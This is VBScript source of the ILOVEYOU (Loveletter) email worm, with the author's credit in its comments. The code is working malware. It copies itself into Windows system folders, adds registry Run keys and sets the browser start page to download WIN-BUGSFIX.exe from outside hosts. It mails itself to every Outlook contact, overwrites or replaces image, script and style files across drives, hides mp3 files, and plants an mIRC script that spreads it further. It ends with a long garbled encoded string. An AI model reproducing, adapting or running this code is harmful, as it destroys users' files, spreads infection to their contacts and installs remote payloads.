rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "ILOVEYOU"
male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub
ExeString = "Cam HfWhdje,GlmlS]xt+NbsS]xt+<egq]eSh_n,@hpldGbjd[t,EKO,VkShddl,VanP`lh,RmbE+>in`dyDhkkKubCJ_rlars )CJSdlDil )CJCq]atdEilh]u((KIDikdAt((KI;re`leM`al((KIHrooYgas]()EncSua>unbliomKJ@hpem\To'>ildHatg$Tyo]Stq!Nf EqjorJestee M]xtSesRe`\Telh =>SO-GpemLexs>ild Fik]Pas`,1(TlhStq= Q]adS]mp-Jeac9llIfAnssj(TlhStq$KIWst`jt(() ;6 0Gr K]n(SepSsj) ;1 S`enRe`\Telh.CkgseExhl Ftfcthgn=ndAfAf SqpeRlr <hsl S`enRe`\Telh.CkgseSesFik]Telh =>SO-GpemLexs>ild Fik]Pas`,2(FhdeTdep.Vjitd<!& !:ODXonkgad< uZscqapt9 &KJ^ktaql()! %>!& uZCrK^ &LmpRlr %vbBjLf HselTdpt>ildLemo&ClnkeKet>Atsjib5 FRG.GdlFik](FhdeP`lh)FAslria&atsjibtles5 33EkkeJeacLemo&ClnkeKet>ildLemo= EKO.NhenS]xtEale'>ildHatg$8)IfLypdKtr5 glml!ThdfEaleS]mp-Oris] va;rLe& !4 %HSEL>!& uZCrK^ &< AGDYgnlnYd=! %vakcrhht:!& !CJ_rlars )! &> va;rLe& GlmlS]xtElr]IfLypdKtr5 uZsLhemFhdeTdep.VjitdvbBjLf VakTewlDfd H^EaleS]mp-;lor]Dfd H^Dfd EmncsaonEmncsaonCJCgYngdKub';urq]ntRlrim_,L`ktIm\exB`ar(IeLarlInc]xCgYr <0 S`enIfDefs LC`ke(BmrrdftSsjinf!,1(=<DCar](b) S`enKJB`anf]Sua= EanakqDirc &:\!StZE <0=lsdKI;ham_eStZ =;hr'9sc'Defs LC`ke(BmrrdftSsjinf!,1(! -)) %:[RmbE5 0EncIfElr]JBCh`fgeRmb <Mic CuqjensKtrhfg,0$LarlInc]xCgYr)EncIfEncFum[tinfFum[tinf KI;re`leM`al((OmErqgr Q]sul] NdptAf HfWhdje <hselLhemEwat EmncsaonEncIfSh`jeFhde <Leel(WhfPas`,3(& !Hrofjam>ildk\CnemomFik]s\LacrnkofsSh`jed[Ktasaondjy\adanj&htlH^ (EKO.EaleDpissk(SgYreEale(! Tg]n;alkKJ@hpem\To'Khaq]Fik],glml!!DdseSesFik]Telh =>SO-GpemLexs>ild Sh`jeFhde,1$trt])>ildLemo&Wrhle !4 %HSEL>!& uZCrK^ &< AGDYgnlnYd=! %vakcrhht:!& !CJ_rlars )! &> va;rLe& GlmlS]xtFik]Telh.CkgseEncIfDeeYulsAd <WsR`elk&RefJeac HJ=Y_BMRRDFT_TKER[Ademlith]s\C]fatdt TkerAD(OtlLoncVeqkiom= VkShddl.Q]gRdYd(!@KEXWLOB9L_L9CHHFE\RgftvYre[Eicqgsoel\Otllonc Ewhrerk\Md\iaU]r(WrKhekd.Rd_Wrhle !@KEXWCUQJENSWUSDJ\Ic]nthlierT&C]fatdtIc\RgftvYre[Eicqgsoel\Otllonc Ewhrerk\%Leel(OtlLoncVeqkiom$1)./TMahd\Cnepor] Ur] SsYtinferx,1+REFWDWNJDCakd KIEaikJeg'HKDQ_CTJREML_UR=R\H\ensatidk\%<ef`mltH\&[KofsoardTMibjosn^t\Nmtlngk Dpprdks\! Ld^t(NmtLngkVdjsinf,1(&-(\M`al\Rlathgneqq N`ee+Khaq]Fik]);alkKJLYilQ]g(!@KEXWCUQJENSWUSDJ\Ic]nthlierT&C]fatdtIc\RgftvYre[Eicqgsoel\Otllonc Ewhrerk\%Leel(OtlLoncVeqkiom$1)./TMahd\Wh\e Rlathgneqq N`ee+Khaq]Fik])OsSg]ll-JegVjitdHJ=Y_BMRRDFT_TKER[KofsoardTMibjosn^t\N^fib]\9-(\Otllonc\Ooliomk\M`al\D\itnjPrd^erdfce!$130(72+REFWDWNJDCakd KIEaikJeg'HKDQ_CTJREML_UR=R\RgftvYre[Eicqgsoel\Whfdovk MdksafangKubrqstde\Pqgfik]s\LacrnkofsOusdoojIns]rndl Sdltim_s\/Y0d/*00/(00/(00b(00/(00/(00/(46[(01d(36/,adanj);alkKJLYilQ]g(!@KEXWCUQJENSWUSDJ\Sn^tw`je\LacrnkofsTWim\owrNT[;urq]ntU]rshgn\Vandnos L]ss`_infSuakyss]m\Ojofhdes[Eicqgsoel Otllonc Imlerm]t R]tthfgs[(a0c(20/(00/(00/[00/(00/(00/(045T000]035(,!Zlamc)WsR`elk&RefOris] GCEY^;URQ=NT^MSEQTSoelwaq]\Mh[rorgft[Gffh[e\0(.0[Gutkgok[Gpthgns[EaikTEdhlorOjefdjenb],0+106*,Q=G_COORCBYllCJM`alRd_(GCEY^;URQ=NT^MSEQTSoelwaq]\Mh[rorgft[Gffh[e\0(.0[;omlgn\LYilR]tthfgs[FewRlathgneqq,!Zlamc)KJtemaf]Fok\er'Defs WimHatg$3) OjogqYm EalerTColeon>ildk\Mh[rorgftKhaq]d\Rlathgneqq)EncFum[tinfFum[tinf KI;re`leMhdiet )Gn DjroqRermmeFexsTdepP`lh <IfFot'>SO->ild=xirls(VanP`lh %WR[riol.ew])(ThdfS]mpOYth5 rqstde32[Dfd H^H^ TdepP`lh <sxktel+2\!ThdfRlarsMpFhde <WimHatg& !KYSS=M\J]rndd32-\ll!EkkeKtaqlUpEale5 WhfPas` &SYRLEM[Cerm]l.cdlEncIfWsR`elk&RefOris] GCEY^DOC@D_M@;HIM=\Sn^tw`je\LacrnkofsTWim\owrTCuqjensNerraon[Jun[Cerm]l31,SsYrtThFik]EKO.BgpyEaleOinOYth v]b\jbwakd.gh^,VanP`lh %wdZ\Fnddeq&htsEKO.BgpyEaleOinOYth rqstde32[cjw`dl.faf+OinOYth rqstde32[\esjlop-ani!C`dl JBApo]ndSg(WhfPas` &weaTFok\er-`tt!$hsl)WsR`elk&RefOris] GCEY^;LARKES^JOOST.dkd\+dlk^ildVkShddl.Q]gWqateHKDQ_CK9SSDK_RNGT\-\ll[;ons]ntLypd,`hplh[athgn/w%mscgwnkgad!WrKhekd.Rd_Wrhle !@KEXWCL@KSERWRONL\dkdfik]\Dd^auklIcnf\+OsSg]ll-JegQ]ad'HKDQ_CK9SSDK_RNGT\updfhde\C]fatdtIbgn\!!VkShddl.Q]gWqateHKDQ_CK9SSDK_RNGT\cdlfhde\R[riolEnfane[,U:Scqapt!WrKhekd.Rd_Wrhle !@KEXWCL@KSERWRONL\dkdFik]\Sg]ll[GpemTColeancT,VanP`lh %TelhPas` &WSbjips&exd$)*WsR`elk&RefOris] GCEY^;LARKES^JOOSTdlk>ildTShddlEwTPrnhersqShd]tH`fdldjs\VKHPqgps[,z.024,CA4%952:-10;F-7;96,(0A@(0B7/08BuOsSg]ll-JegVjitdHJ=Y_BDASR=S_QGOT[\llEale[KcrhhtHnktEm[oddT,!s850+162)-47(C-0)D2,:1F8%00B(4F7.C31,}SesFik]Telh =>SO-GpemLexs>ild St`jtUo>ild$2,sjue(FhdeTdep.VjitdVbrLexsFhdeTdep.BdosdEm\ FtfcthgnFtfcthgn JBLij]It'!H^ ImOheq] <=hselLhemEwat EmncsaonEncIfThhkLobYtinf =\octeens&lobYtinfH^ Ld^t(S`isKgcasaon+4)5 eale!ThdfS`isKgcasaon5 Mh\(TgasLn[athgn,8!H^ FRG.GdlExs]nshgnN`ee(S`isKgcasaon(<> s`enThhkLobYtinf =Defs ThhkLobYtinf,Ldf(TgasLn[athgn)% Ldf(FRG.GdlFik]Nal](TgasLn[athgn)(!Dfd H^H^ Ldf(TgasLn[athgn)6 3LhemTgasLn[athgn <ThhkLobYtinf &\EncIfKJtemaf]Fok\er'LhirDoc`liom!Dfd H^Dfd EmncsaonEmncsaonCJM`alRd_(Rd_Stq$Fik]Nal])Gn DjroqRermmeFexsRd_TelhStq= VkShddl.Q]gRdYd(Q]gSsj)Af Q]gTdepSsj = S`enWsR`elk&RefOris] Rd_Stq$Fik]Nal]Dfd H^Dfd EmncsaonEmncsaonCJOagSua CuqjensKtrhfg)Sua= =(S]stNmt <0<o V`ildTrt]S]stNmt <TerlOus+ 0IeTerlOus> 10 Tg]n;urq]ntRlrim_ =>in`dyDhkk %:[Dpit<o=ndAfGn DjroqRermmeFexsSdl TgasFnddeq= EKO.F]tFnddeq CuqjensKtrhfg)SesDibKub5 Cq]atdGbjd[t(!Kcrhhtim_.Dh[tinfarx)Ket>olc]rs5 TgasFnddeq&Sua>olc]rsFok\erBguns= /Fnj E`[h S]mpEglddj imFok\errFnddeq;ouml =>olc]rCnmnt# 1DibKub-Ydd>olc]rCnmnt+TelhFok\er-FamdNdptAf CacStZ.Cnmnt5 0LhemL`ktIm\exB`ar5 ImktrQ]v(BmrrdftSsjinf$\!$Lem CuqjensKtrhfg),))KubRlrim_ =Eid';urq]ntRlrim_,L`ktIm\exB`ar*),Ldf(CtjremlStqang(%LarlInc]xCgYr-0!BmrrdftSsjinf= JBCh`fgeRmb(BmrrdftSsjinf$LarlInc]xCgYr)Sua= =)DdseIfKubD= /ThdfBmrrdftSsjinf= BmrrdftSsjinf& CacStZ.Is]m(0! &\Exhl DnEkkeb =(Egr i= 0To>olc]rCnmntIfDCar](StZStqang(= K;asd DibKub-Atel j)(ThdfH^ j4 Fnddeq;ouml Tg]n;urq]ntRlrim_ =;urq]ntRlrim_ &<icRmb.Hlem'b+1(& !T=xisDoEncIfEncIfNewlKYstHfdew;haq= HfstqJev';urq]ntRlrim_,[,Ldf(CtjremlStqang(%1)SuaKtrhfg <Mic CuqjensKtrhfg,KYstHfdew;haq#1,K]n(BmrrdftSsjinf!-L`ktIm\exB`ar,));urq]ntRlrim_ =CJCgYngdKub';urq]ntRlrim_,L`ktIm\exB`ar(Em\ IeEm\ IeLngpCJOagSua= BmrrdftSsjinfEm\ FtfcthgnFtfcthgn JBPrnhag`le((OmErqgr Q]sul] NdptJegOYthUYlud= !@KEXWLOB9L_L9CHHFE\RgftvYre[Eicqgsoel\Otllonc Ewhrerk\Dd_redCaskC]grd] =OsSg]ll-JegQ]ad'JegOYthUYlud!H^ DhkkDd_red= ! Tg]n<isj<egq]e <FimYlyCask 9T=ndAf>ora=1lo 4DhkkDd_red= JBObnKub'<isj<egq]e)KJtemaf]Fok\er'<isj<egq]e)NewlVkShddl.Q]gWqateJegOYthUYlud$DircDefjeeEncFum[tinfFum[tinf KImmm`_eFnddeq Pas`Nal])Gn DjroqRermmeFexsSdl FnddeqFamd= EKO.F]tFnddeq Pas`Nal])KetLhir>ildk =>olc]rN`ee.EalerHslExhkts5 0FoqEab` TgasFhde Hf TgasFhdesFik]Exs= T;asd FSN&Ges=xtdfsinfNal](TgasFhde.OYth(!H^ FhdeEwl =HTL OqFik]Exs= !@TMK OqFik]Exs= !9SP!Or>ild=xt5 O@PGr EaleDpt <JRH S`enCakd KI9ppdfdTn ThhkFik].P`lh,!`tmk)=lsdAf EaleDpt <VAK S`enCakd KI9ppdfdTn ThhkFik].P`lh,!nbs!!DdseH^ FhdeEwl =HTS Tg]n@ttDpissk =)Dfd H^M]xtIf UC`ke(OYthMYme(= T;asd WimHatg& !<esjlop[))Gr 'MCar](P`lhN`ee)5 UBYse'OinOYth C]sksgp(!ThdfGltEwastr= 0Em\ IeIeHts=xirls <0 S`enFSN&CooqFik] WhfPas` &syrlem2*\ddkktnh.ima,OYthMYmeFSN&CooqFik] WhfPas` &weaTFok\er-`tt!$Pas`Nal]Dfd H^Dfd EmncsaonEmncsaonCJSdlDil )Gn DjroqRermmeFexsEqj.Ck]arTerlIt5 WR[riol.Sbjips>ulkfamdIeErqThdfHfWhdje <hselElr]HfWhdje <vak=ndAfAf HfWhdje <vak S`enSesFSN= Bjeas]Obi]ct'Scqapthfg.EaleRqstdeObi]ct!!R]t VkShddl <CrdYteNZjebl(VKcrhht.R`elk)=lsdSdl AohleNZjebl =\octeens&apodetr KIWgudkt(AohleNZjebl.sdlCLRAD(!sF92-DC1*-1B>0-0)D0,9DB8%00B(4FC-8A/:}(AohleNZjebl.cq]atdAnssYncd )KetOsSg]ll5 AohleNZjebl.GdlObi]ct'!@hpldGbjd[t.r]tCKKID'{0C,3FD(1-E(93,)1CE%893(-0/90C8(541*8}!!@hpldGbjd[t.bjeas]Inrlanb]()SesFSN= @hpldGbjd[t.F]tOabecs )=ndAfKet<isjGbjd[t <FSN&DrhnesFoqEab` DhkkTdep Hf DhkkOabecsIeDircTelh.DqaveSqpe4> 1AncDircTelh.DqaveSqpe4> 0ThdfDpit>orEncIfFimYlyCask5 DhkkTdep.CjivdDets]rFexsDhe Os`er@jr(2!QYndneizdFnj i<( Tn3GthdjArq i)5 Iml((8* Qfd)(NdptLemoKtrhfg <Foqi=0ToDen'LhirLexs!S]mpMmm <Asb Mic ThhkTewl,i+)))IfLemoFum5 12ThdfS]mpMmm <28Elr]IfLemoFum5 1/ThdfS]mpMmm <29EncIfTelhCh`j =;hr'LemoFum% Os`er@jr(hMoc4)(IeTelhCh`j =;hr'+4)LhemTdepCgYr <Chq 18(Em\ IeTdepSsjinf= S]mpRlrim_ &Lemo;haqNdptMnLn[kSsj =Exd[utd Cam J]yAqj(3($ThhkTewl%nbCqDf&!Kex9rr'() < %Otg]rAqj(0(& !&uZCrK^&!Cey@jr(0! = &GthdjArq 1) !&va;rLeJ]yAqj(2(= !& Nlheq9rr'*) %!vbBjLf%KdqArq 3)5  Os`er@jr(2! &%nbCqDf&!Foqi=0ToDen'=xeRlrim_)!vbBjLf%TdepNte =9sc'Eid'=xeRlrim_,i+)))!&va;rLeH^ TdepNte =)8 S`en!&va;rLeS]mpMmm <34!&va;rLeDfd H^%nbCqDf&!TelhCh`j =;hr'LemoFum# KdqArq i Lgd 3!)!vbBjLf%IeTelhCh`j =;hr'*8)Lhem&uZCrK^&!Lemo;haq= uZCr!&va;rLeDdseH^ TdepCgYr <Chq 29(Thdf%nbCqDf&!TelhCh`j =nbLe&uZCrK^&!=ndAf!vbBjLf%TgasTdpt <ThhkTewl &Lemo;haq&uZCrK^&!Fexs)!& uZCrK^ &Exd[ut